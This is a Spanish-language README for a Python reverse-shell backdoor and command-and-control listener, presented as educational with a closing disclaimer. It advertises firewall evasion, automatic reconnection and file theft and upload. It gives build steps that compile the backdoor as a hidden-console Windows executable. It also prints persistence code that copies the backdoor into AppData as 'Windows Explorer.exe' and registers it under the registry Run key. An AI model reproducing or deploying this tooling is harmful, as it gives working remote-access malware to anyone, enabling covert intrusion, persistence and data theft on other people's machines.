# 🔧 Simple TCP Reverse Shell (C2 Framework)

Este proyecto es un ejemplo educativo de comunicación **C2 (Command & Control)** utilizando Sockets en Python. Permite la ejecución remota de comandos, navegación por directorios y transferencia de archivos entre una máquina atacante y una máquina de prueba.

---

## 🚀 Características Principales

- ✅ **Conexión Inversa TCP:** Evade restricciones de firewall entrantes
- ✅ **Transferencia de Archivos:** Subida y descarga mediante Base64
- ✅ **Persistencia en Windows:** Auto-copia y registro automático en Startup
- ✅ **Reconexión Automática:** Reintento cada 10 segundos si se pierde la conexión
- ✅ **Comunicación Confiable:** JSON para manejar búferes de datos grandes
- ✅ **Navegación Remota:** Cambio de directorios con comando `cd`
- ✅ **Manejo de Errores Robusto:** No se cierra ante errores de red

---

## 📋 Requisitos Previos

```bash
# Python 3.6+
python3 --version

# Librerías necesarias (incluidas en la instalación estándar)
# socket, subprocess, json, os, base64, shutil, time
```

---

## 🛠️ Instalación y Configuración

### 1️⃣ Clonar o Descargar el Proyecto

```bash
git clone https://github.com/tu-usuario/tcp-reverse-shell.git
cd tcp-reverse-shell
```

### 2️⃣ Configurar las IPs

**En `listener.py` (línea final):**
```python
escucha = Listener("0.0.0.0", 4444)  # Escucha en todas las interfaces
```

**En `backdoor.py` (línea final):**
```python
puerta = Backdoor("192.168.1.X", 4444)  # Cambia por tu IP atacante
```

### 3️⃣ Compilar a Ejecutable (Opcional)

Para ejecutar en Windows sin Python instalado:

```bash
# Instalar PyInstaller
pip install pyinstaller

# Compilar sin consola visible
pyinstaller --noconsole --onefile backdoor.py

# El ejecutable estará en ./dist/backdoor.exe
```

---

## 💻 Guía de Uso

### Paso 1: Iniciar el Listener (Servidor)

En tu máquina atacante:

```bash
python3 listener.py
```

**Salida esperada:**
```
[+] Esperando conexiones...
[+] Conexión establecida desde ('192.168.1.100', 54321)
>>
```

### Paso 2: Ejecutar el Backdoor (Cliente)

En la máquina de prueba:

```bash
python3 backdoor.py
# O si está compilado:
backdoor.exe
```

El agente se conectará automáticamente al listener.

### Paso 3: Ejecutar Comandos

Una vez conectado, tienes acceso a los siguientes comandos:

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `dir` | Listar archivos (Windows) | `dir` |
| `ls` | Listar archivos (Linux/Mac) | `ls -la` |
| `cd <ruta>` | Cambiar de directorio | `cd C:\Windows` |
| `whoami` | Ver usuario actual | `whoami` |
| `ipconfig` | Ver configuración de red | `ipconfig` |
| `descargar <archivo>` | Descargar archivo de la víctima | `descargar C:\Users\Admin\flag.txt` |
| `subir <archivo>` | Subir archivo a la víctima | `subir malware.exe` |
| `salir` | Cerrar sesión | `salir` |

---

## 📁 Estructura del Proyecto

```
tcp-reverse-shell/
├── listener.py          # Servidor (máquina atacante)
├── backdoor.py          # Cliente (máquina víctima)
├── README.md            # Este archivo
└── dist/
    └── backdoor.exe     # Ejecutable compilado (opcional)
```

---

## 🔍 Detalles Técnicos

### Funciones Clave

#### `reliable_send(data)`
Serializa datos a JSON y los envía de forma segura:
```python
def reliable_send(self, data):
    json_data = json.dumps(data)
    self.connection.send(json_data.encode())
```

#### `reliable_receive()`
Recibe datos en fragmentos y los reensambla:
```python
def reliable_receive(self):
    json_data = b""
    while True:
        try:
            json_data = json_data + self.connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue
```

#### `become_persistent()` (Backdoor)
Copia el ejecutable a AppData y lo registra en el Startup:
```python
def become_persistent(self):
    file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '" /f', shell=True)
```

---

## 🔐 Seguridad y Privacidad

### ⚠️ Descargo de Responsabilidad

**Este software ha sido creado exclusivamente con fines EDUCATIVOS y de AUDITORÍA ÉTICA.**

- ❌ **NO** usar contra sistemas sin consentimiento previo por escrito
- ❌ **NO** usar en redes públicas o ajenas
- ❌ **NO** distribuir sin fines legales
- ✅ **SOLO** usar en entornos de laboratorio controlados

**El desarrollador NO se hace responsable del mal uso de este código.**
